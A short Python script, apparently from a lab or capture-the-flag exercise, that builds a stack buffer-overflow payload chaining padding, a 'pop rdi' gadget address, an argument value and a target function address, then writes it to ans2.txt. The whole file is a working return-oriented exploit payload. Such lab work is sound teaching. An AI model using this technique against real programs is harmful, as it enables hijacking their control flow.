padding = b"A" * 16
pop_rdi_address = b"\xc7\x12\x40\x00\x00\x00\x00\x00"
target_rdi= b"\xf8\x03\x00\x00\x00\x00\x00\x00"
func2_address = b"\x16\x12\x40\x00\x00\x00\x00\x00"
payload = padding + pop_rdi_address + target_rdi + func2_address
# Write the payload to a file
with open("ans2.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans2.txt")